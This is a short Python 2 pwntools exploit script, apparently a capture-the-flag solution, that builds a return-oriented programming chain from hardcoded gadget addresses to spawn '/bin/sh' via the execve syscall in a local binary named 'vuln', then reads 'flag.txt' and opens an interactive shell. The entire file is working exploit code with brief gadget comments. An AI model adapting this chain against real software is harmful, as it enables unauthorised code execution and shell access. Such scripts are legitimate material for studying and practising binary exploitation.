#!/usr/bin/env python2
from pwn import *
from struct import pack

BASE = 0
mov_rdi_rax_call_rcx = BASE+0x00423613
pop_rdx = BASE+0x0044bf16
pop_rcx_jmp_to_almost_rdx = BASE+0x00438be2
pop_rsi = BASE+0x004100d3
pop_rax = BASE+0x004156f4
pop_rdi = BASE+0x00400686
syscall = BASE+0x00449135
mov_rdi_rdx = BASE+0x00435693
something_at_got_plt = 0x6B9008

payload = "/bin/sh\x00AAAAAAAABBBBBBBB"
payload += pack("<Q",pop_rdi)
payload += pack("<Q",something_at_got_plt)
payload += pack("<Q",pop_rdx)
payload += pack("<Q",pop_rdx)#let rdx contain address of pop rdx
payload += pack("<Q",mov_rdi_rdx)#rdi contains pointer to pop rdx
payload += pack("<Q",pop_rdx)
payload += pack("<Q",something_at_got_plt+0x2f) # let rdx contain address of almost pop rdx
payload += pack("<Q",pop_rcx_jmp_to_almost_rdx)
payload += pack("<Q",pop_rdx) # let rcx contain address of pop rdx
payload += pack("<Q",0)
payload += pack("<Q",mov_rdi_rax_call_rcx)
payload += pack("<Q",pop_rsi)
payload += pack("<Q",0)
payload += pack("<Q",pop_rdx)
payload += pack("<Q",0)
payload += pack("<Q",pop_rax)
payload += pack("<Q",59)
payload += pack("<Q",syscall)

p = process("./vuln")
p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()